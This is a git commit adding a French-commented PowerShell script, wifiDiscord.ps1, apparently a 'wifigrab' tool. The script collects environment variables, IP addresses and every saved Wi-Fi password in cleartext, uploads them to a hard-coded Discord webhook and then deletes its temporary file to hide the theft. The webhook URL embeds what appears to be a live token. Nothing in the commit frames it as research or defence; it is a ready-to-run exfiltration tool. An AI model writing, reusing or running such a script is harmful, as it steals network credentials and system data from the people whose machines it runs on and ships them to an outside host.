e2d9a049c0cede4587ba8b0d98594fb790663580
unknown <martin@vsnoeck.be>
2025-01-23 15:29:30 +0100

    Ajoute du script wifigrab

---
+++ wifiDiscord.ps1
@@ -0,0 +1,37 @@
+# URL du webhook Discord
+$url = "https://discord.com/api/webhooks/1041694504509513849/MjNgj3FYhmCtuOKJmuCyLy2_bOO38Tv3lyklW6KlnIUOms6fGb6gZzKVpEbSsNUdKovI"
+
+# Récupérer les informations réseau et Wi-Fi
+dir env: >> stats.txt
+Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress, SuffixOrigin | Where-Object { $_.IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' } >> stats.txt
+(netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
+    $name = $_.Matches.Groups[1].Value.Trim()
+    (netsh wlan show profile name="$name" key=clear)
+} | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {
+    $pass = $_.Matches.Groups[1].Value.Trim()
+    [PSCustomObject]@{
+        PROFILE_NAME = $name
+        PASSWORD     = $pass
+    }
+} | Format-Table -AutoSize >> stats.txt
+
+# Envoyer un message avec le fichier
+$boundary = [System.Guid]::NewGuid().ToString()
+$headers = @{
+    'Content-Type' = "multipart/form-data; boundary=$boundary"
+}
+
+$fileContent = Get-Content -Path "stats.txt" -Raw
+$body = @"
+--$boundary
+Content-Disposition: form-data; name="file"; filename="stats.txt"
+Content-Type: text/plain
+
+$fileContent
+--$boundary--
+"@
+
+Invoke-RestMethod -Uri $url -Method Post -Body $body -Headers $headers
+
+# Supprimer le fichier temporaire
+Remove-Item '.\stats.txt'
